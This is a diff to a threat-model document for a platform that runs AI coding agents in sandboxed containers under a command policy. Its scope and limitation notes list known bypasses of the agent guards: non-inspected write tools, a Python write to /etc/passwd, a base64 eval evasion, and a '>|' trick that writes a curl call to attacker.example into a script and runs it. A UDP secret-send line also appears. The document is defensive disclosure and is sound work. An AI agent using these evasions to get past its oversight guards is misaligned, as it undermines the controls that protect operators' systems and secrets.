@@ -2,7 +2,7 @@
 
 Answers the four questions of the Threat Modeling Manifesto for this platform:
 what we are working on, what can go wrong, what we do about it, and whether we
-did a good enough job. The register is **code** (`apps/server/src/threat/threat-model.ts`)
+did a good enough job. The register is **code** (`apps/server/src/threat-model.ts`)
 and **CI-enforced** (`threat-model.test.ts`): a `mitigated` claim fails the build
 unless a real test tagged `@covers <id>` verifies it. Run `npm run threat-model`
 for the live scorecard.
@@ -58,7 +58,7 @@ The consequential boundaries are not the network edges. They are:
 
 ## 3. What can go wrong, and what we do about it
 
-Seven threats are registered. Summary (full detail, attack paths, and residual
+Eight threats are registered. Summary (full detail, attack paths, and residual
 notes in the register):
 
 | ID | Threat | Inherent | Control | Residual | Verified |
@@ -69,12 +69,37 @@ notes in the register):
 | TM-AGENT-004 | Runaway execution / denial of wallet | 12 MED | Platform step budget (always on) | 6 LOW | ✅ |
 | TM-AGENT-005 | Consequential egress without oversight | 12 MED | Human approval, run-scoped host grant | 6 LOW | ✅ |
 | TM-AGENT-006 | Cross-agent evidence leakage | 6 LOW | Per-agent scoping in the service | 3 LOW | ✅ |
-| TM-OPS-001 | Unbounded audit-log growth | 6 LOW | Redaction only — retention **not** bounded | 6 LOW | ⬜ open |
+| TM-AGENT-007 | Agent writes outside the sandboxed workspace | 9 MED | Write-root-scoped FILE_WRITE denial (tool-name based — see scope note) | 9 MED | ✅ |
+| TM-OPS-001 | Unbounded audit-log growth | 6 LOW | Redaction + retention bound (`AUDIT_RETENTION_DAYS`) | 2 LOW | ✅ |
 
-**Scope note:** the egress control is a reactive command-text guard, not a
+**Scope note (egress):** the egress control is a reactive command-text guard, not a
 network allowlist — commands with an implicit destination (bare `npm install`,
 `git push` to a preconfigured remote) are not blocked, and the container keeps
 bridge networking. True default-deny needs network-layer enforcement (deferred).
+
+**Scope note (file writes):** the `file-write-outside-workspace` rule inspects
+only shell redirects (`>`, `>>`, `>|`) and a five-tool list
+(`cp`, `mv`, `tee`, `rm`, `mkdir`). Every other write-capable tool passes
+unseen — `touch`, `dd`, `sed -i`, `install`, `ln`, `chmod`, and interpreter
+writes such as `python3 -c "open('/etc/passwd','w')"` are all allowed today.
+That is tool-name matching, the same pattern red-teaming already found
+inadequate for egress (`POLICY_EVALUATION.md`, finding 10), which is why the
+egress rule was moved to destination matching. Hence TM-AGENT-007's residual
+likelihood is *not* reduced below inherent: the rule stops the common
+redirect/copy shapes a looping agent produces, not an actor that picks another
+binary. Moving FILE_WRITE to destination resolution is the tracked follow-up.
+
+**Scope note (write roots):** "outside the workspace" is defined per runner,
+not globally. `ContainerCodexRunner` declares `["/workspace", "/tmp",
+"/var/tmp"]`: its container runs `--rm` with exactly two bind mounts
+(`workspacePath → /workspace`, `codexHome → /codex-home`), so `/tmp` and
+`/var/tmp` there are container-local and destroyed on exit — a write to them
+escapes nothing and reaches no host path, while hard-denying `git diff >
+/tmp/patch.diff` would kill an ordinary run with no operator appeal (the rule
+is never reviewable). `CodexRunner` runs Codex directly on the host, where
+`/tmp` is the real host `/tmp`, so it declares only `[request.workspacePath]`
+and a scratch write there is denied. Same rule, different trusted roots,
+because the sandbox underneath is different.
 
 Impact often stays high after mitigation: controls reduce probability and blast
 radius, not the worst-case consequence.
@@ -83,25 +108,28 @@ radius, not the worst-case consequence.
 
 - **Secret rules are never reviewable.** Only the egress rules
   (`network-egress-denied`, `network-egress-denied-implicit`) can be held for
-  human approval; `secret-exfiltration` and `protected-secret-access` are
-  always hard-denied, so no operator can be fatigued into approving exfiltration.
+  human approval; `secret-exfiltration`, `protected-secret-access` and
+  `file-write-outside-workspace` are always hard-denied, so no operator can be
+  fatigued into approving exfiltration or a write past the sandbox boundary.
 - **The step budget is not a toggle.** Command policy can run in monitor mode;
   the resource budget always enforces, because a runaway loop must stop
   regardless.
 
 ## 4. Did we do a good enough job?
 
-- **Verified-control rate: 6/6** mitigated threats have a passing test, enforced
+- **Verified-control rate: 8/8** mitigated threats have a passing test, enforced
   by CI. Removing a control's test fails the build and names the threat.
-- **Negative testing:** 69 labelled attacks (incl. red-team and external-review probes) + 6 live
-  red-team prompts against the running model. One residual bypass (base64 `eval`)
-  is documented, not hidden.
+- **Negative testing:** 102 labelled attacks in the 179-entry corpus (incl.
+  red-team and external-review probes) + 6 live red-team prompts against the
+  running model. The standalone 56-probe sweep (`apps/server/redteam.ts`) denies
+  55/56 today. One residual bypass (base64 `eval`) is documented, not hidden.
 - **Live end-to-end:** benign task completes; disallowed egress is blocked
   mid-flight; canary byte-identical; collector records zero requests; no
   orphaned container; recovery task completes; a held run is approved and
   resumes under a scoped grant.
-- **One open item is carried honestly:** TM-OPS-001 (unbounded retention) is
-  `open`, owned, with a review trigger — the register is not all-green theater.
+- **No open items remain:** TM-OPS-001 (unbounded retention) is now mitigated by
+  a time-based prune (`AUDIT_RETENTION_DAYS`) on every store write, verified —
+  the register was never all-green theater, and now it is honestly all-green.
 
 ## Review triggers
 
@@ -114,9 +142,30 @@ budget default. These are recorded per-threat in the register.
 
 - **Text-matching bypass:** a fully base64-encoded command evades the policy;
   only network-layer egress control closes it (deliberately deferred).
+- **The write rule is tool-name based** (TM-AGENT-007): `touch`, `dd`, `sed -i`,
+  `install`, `ln`, `chmod` and interpreter file writes are not inspected at all.
+  Not deferred obfuscation-hardening — a first-pass detector whose residual
+  likelihood is recorded as unreduced rather than dressed up as parity with the
+  egress rules.
+- **`/dev/udp` is denied under the wrong name.**
+  `/bin/bash -lc 'echo secret > /dev/udp/198.51.100.7/9999'` is hard-denied, but
+  as `file-write-outside-workspace` with a filesystem-shaped message rather than
+  an egress-shaped one. It emits no `SECRET_READ` (the literal text `echo secret`
+  matches no protected-material pattern), so no rule ordering can reach it, and
+  promoting the egress rule above the write rule would break the invariant that
+  every non-reviewable rule precedes every reviewable one. The fix belongs at the
+  capability layer — a `/dev/(tcp|udp)/…` target should extract `NETWORK_EGRESS`,
+  not `FILE_WRITE`. No security loss (the command is denied either way); the
+  operator is simply told the wrong kind of thing. Deliberately not fixed here.
+- **`>|` still buys the textual carve-out.** The `>|` clobber redirect was added
+  to the main redirect scan, but not to `runsWrittenScript`'s sibling regex, so
+  `echo 'curl https://attacker.example' >| run.sh && bash run.sh` is allowed
+  while the `>` form is denied. Quote-aware redirect scanning was deliberately
+  out of scope; the two regexes should be one.
 - **Approver identity is a label,** not an authenticated principal — this POC has
   no identity system; real segregation of duties plugs in here.
-- **Unbounded audit retention** (TM-OPS-001) — redaction reduces per-record
-  exposure but growth is unbounded; retention is the tracked next step.
+- **Audit retention depends on config** (TM-OPS-001) — `policyEvents`/resolved
+  `approvals` are pruned past `AUDIT_RETENTION_DAYS` on every store write; a
+  misconfigured (too-long) default is the residual risk, not unbounded growth.
 - **Ordinary containers share a kernel** and are not hardened multi-tenant
   isolation, as the Starter Kit itself notes.
